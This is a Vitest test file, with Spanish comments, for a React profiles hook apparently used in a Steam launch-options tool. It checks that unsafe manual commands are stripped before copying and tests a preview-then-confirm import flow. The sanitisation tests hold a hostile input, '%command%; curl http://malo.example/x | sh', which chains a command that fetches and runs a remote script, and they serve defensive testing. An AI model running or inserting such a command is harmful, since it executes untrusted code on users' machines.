import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { act, cleanup, renderHook, waitFor } from '@testing-library/react';
import { api } from '../lib/api';
import { useProfiles } from './useProfiles';
import type { Profile } from '../lib/types';

afterEach(cleanup);

beforeEach(() => {
  vi.restoreAllMocks();
});

/**
 * Perfil mínimo. `appid: 0` (juego de otro launcher) para que `rebuildOne` no
 * consulte anti-cheat ni motor: aquí solo interesa la rama del comando manual.
 */
const perfil = (manual_command: string): Profile =>
  ({
    id: 'p1',
    name: 'Perfil',
    appid: 0,
    game_name: 'Juego',
    enabled_params: [],
    selected_community_recs: [],
    selected_engine_recs: [],
    force_proton: false,
    expert_mode: false,
    manual_command,
    use_manual_command: true,
    created_at: '2026-01-01 12:00:00',
    updated_at: '2026-01-01 12:00:00',
  }) as Profile;

/** Deja la API en el mínimo que necesita `rebuildOne` para el camino normal. */
function mockApi() {
  vi.spyOn(api, 'getCommunityRecommendations').mockResolvedValue([]);
  vi.spyOn(api, 'getRules').mockResolvedValue({
    appid: 0,
    name: 'Juego',
    bottleneck: '',
    summary: '',
    params: [],
    tips: [],
    has_rules: false,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  } as any);
  vi.spyOn(api, 'detectEngine').mockResolvedValue(null);
}

describe('useProfiles: un perfil guardado no cuela un comando manual inseguro', () => {
  it('copia el comando manual si es seguro', async () => {
    mockApi();
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });

    const { result } = renderHook(() => useProfiles({ getHwTags: () => [] }));
    await result.current.copyCommand(perfil('gamemoderun %command%'));

    await waitFor(() => expect(writeText).toHaveBeenCalledWith('gamemoderun %command%'));
  });

  it('ignora un comando manual con orden encadenada y cae al comando normal', async () => {
    // El caso real: un perfil importado ANTES de este cambio, o uno manipulado a
    // mano en profiles.json. `rebuildOne` devolvía el texto tal cual y acababa en
    // el portapapeles listo para pegar en Steam.
    mockApi();
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });

    const { result } = renderHook(() => useProfiles({ getHwTags: () => [] }));
    await result.current.copyCommand(perfil('%command%; curl http://malo.example/x | sh'));

    await waitFor(() => expect(writeText).toHaveBeenCalled());
    const copiado = writeText.mock.calls[0][0] as string;
    expect(copiado).not.toContain('curl');
    expect(copiado).toBe('%command%');
  });

  it('tampoco deja pasar una ruta absoluta', async () => {
    mockApi();
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });

    const { result } = renderHook(() => useProfiles({ getHwTags: () => [] }));
    await result.current.copyCommand(perfil('/tmp/evil %command%'));

    await waitFor(() => expect(writeText).toHaveBeenCalled());
    expect(writeText.mock.calls[0][0]).toBe('%command%');
  });
});

describe('useProfiles: importación en dos pasos', () => {
  const preview = {
    profiles: [
      {
        id: 'p9',
        name: 'Importado',
        game_name: 'Juego',
        appid: 0,
        enabled_params: [],
        manual_command: undefined,
        keeps_manual_command: false,
        manual_command_reason: '',
        duplicate: false,
      },
    ],
    duplicates: 0,
    stripped_commands: 0,
  };

  it('importFromText NO importa: solo enseña la vista previa', async () => {
    // La clave del cambio: antes el perfil ya estaba en disco al enterarse.
    const previewSpy = vi.spyOn(api, 'previewImportProfile').mockResolvedValue(preview);
    const importSpy = vi.spyOn(api, 'importProfileFromText').mockResolvedValue([]);
    vi.spyOn(api, 'loadProfiles').mockResolvedValue([]);

    const { result } = renderHook(() => useProfiles({ getHwTags: () => [] }));
    await act(async () => {
      await result.current.importFromText('{}');
    });

    expect(previewSpy).toHaveBeenCalledWith('{}');
    expect(importSpy).not.toHaveBeenCalled();
    expect(result.current.pendingImport?.preview).toEqual(preview);
  });

  it('confirmImport escribe con el contenido original', async () => {
    vi.spyOn(api, 'previewImportProfile').mockResolvedValue(preview);
    const importSpy = vi
      .spyOn(api, 'importProfileFromText')
      .mockResolvedValue([{ id: 'p9' } as never]);
    vi.spyOn(api, 'loadProfiles').mockResolvedValue([]);
    vi.spyOn(api, 'getCommunityRecommendations').mockResolvedValue([]);

    const { result } = renderHook(() => useProfiles({ getHwTags: () => [] }));
    await act(async () => {
      await result.current.importFromText('contenido-original');
    });
    await act(async () => {
      await result.current.confirmImport();
    });

    expect(importSpy).toHaveBeenCalledWith('contenido-original');
    // Y el cuadro se cierra.
    expect(result.current.pendingImport).toBeNull();
  });

  it('cancelImport cierra el cuadro sin escribir nada', async () => {
    vi.spyOn(api, 'previewImportProfile').mockResolvedValue(preview);
    const importSpy = vi.spyOn(api, 'importProfileFromText').mockResolvedValue([]);

    const { result } = renderHook(() => useProfiles({ getHwTags: () => [] }));
    await act(async () => {
      await result.current.importFromText('{}');
    });
    act(() => {
      result.current.cancelImport();
    });

    expect(importSpy).not.toHaveBeenCalled();
    expect(result.current.pendingImport).toBeNull();
  });

  it('si la vista previa falla, avisa y no abre el cuadro', async () => {
    vi.spyOn(api, 'previewImportProfile').mockRejectedValue('JSON inválido');
    const importSpy = vi.spyOn(api, 'importProfileFromText').mockResolvedValue([]);
    const notify = vi.fn();

    const { result } = renderHook(() =>
      useProfiles({ getHwTags: () => [], onNotify: notify })
    );
    await act(async () => {
      await result.current.importFromText('no es json');
    });

    expect(importSpy).not.toHaveBeenCalled();
    expect(result.current.pendingImport).toBeNull();
    expect(notify).toHaveBeenCalledWith(expect.stringContaining('JSON inválido'));
  });

  it('si todo son duplicados, avisa y no abre el cuadro', async () => {
    vi.spyOn(api, 'previewImportProfile').mockResolvedValue({
      profiles: [],
      duplicates: 2,
      stripped_commands: 0,
    });
    const importSpy = vi.spyOn(api, 'importProfileFromText').mockResolvedValue([]);
    const notify = vi.fn();

    const { result } = renderHook(() =>
      useProfiles({ getHwTags: () => [], onNotify: notify })
    );
    await act(async () => {
      await result.current.importFromText('{}');
    });

    expect(importSpy).not.toHaveBeenCalled();
    expect(result.current.pendingImport).toBeNull();
    expect(notify).toHaveBeenCalledWith(expect.stringContaining('ya están guardados'));
  });
});
